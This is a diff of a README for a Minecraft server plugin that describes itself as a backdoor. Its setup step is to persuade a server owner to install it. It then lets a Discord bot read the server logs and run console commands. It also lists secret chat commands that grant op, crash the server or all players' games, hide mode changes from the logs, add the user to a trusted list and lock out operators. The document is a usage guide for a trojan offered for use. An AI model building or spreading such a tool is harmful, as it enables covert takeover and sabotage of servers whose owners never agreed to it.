@@ -6,19 +6,23 @@ Apache Maven 3.9.9/4.0.0
 Java 16
 
 
-Features:
+# Features:
 
 You can transfer the logs from the server where Backdoor is installed to the discord channel. (!logekle)
 
 You can use commands as Server. (!konsolekle)
 
-How to Setup the console:
+# How to Setup the console:
 
-Build the plugin and make a server owner installs this plugin to his server. After that if he installed this plugin on to his server the bot will activated. Then just type "!konsolekle (channel id)" or "!logekle (channel id)"
+## Build the plugin and make a server owner installs this plugin to his server. After that if he installed this plugin on to his server the bot will activated. Then just type "!konsolekle (channel id)" or "!logekle (channel id)"
 
 Example: ban 15w30x
 
-In-game features (In Chat):
+# In-game features (In Chat):
+
++help opens a help menu.
+
++help2 opens a seconds help menu for other commands.
 
 +1 gives op
 
@@ -32,22 +36,38 @@ In-game features (In Chat):
 
 +5 spams to the console with "/help" command. server will crash after like 10 seconds.
 
-+6 shows a help menu to see commands.
-
 +7 gives op, changes your name, edits your level and health and statistics.
 
 +8 crashes everyones game without in-game log. (Do not forgot to edit the command in src file.)
 
-+9 gives creative mode without console log or in-game log.
++gmc gives creative mode without console log or in-game log.
 
 +sv gives survival mode without console log or in-game log.
 
 +sp gives spectator mode without console log or in-game log.
 
-+x99 adds your acc to trusted players list that you can use commands. (It works if your nickname only has lowercase letters.)
++supremecheats+ adds your acc to trusted players list that you can use commands. (It works if your nickname only has lowercase letters.)
 
 +#op Gives op Everyone (works only on luckperms. you can edit the code if you want to add others)
 
-This commands only works if you are added to trusted players list except "+x99"
+# This commands only works if you are added to trusted players list except "+supremecheats+"
 
-You can edit the code the way you want.
+# Fun
+
+!deop (name) deops the writen player.
+
+!dupe (item count) gives you the item you are holding in your hand according to the number you wrote.
+
+!here draws all players to your side, forming a circle of 5 blocks around you.
+
+!anonim Changes your display name.
+
+!freeze freezes players.
+
+!lock players or ops cant use commands.
+
+!kontrolcubugu 15 blocks will bring everyone around you to their knees xD
+
+!deactivate Makes you non-trusted player
+
+# You can edit the code the way you want.
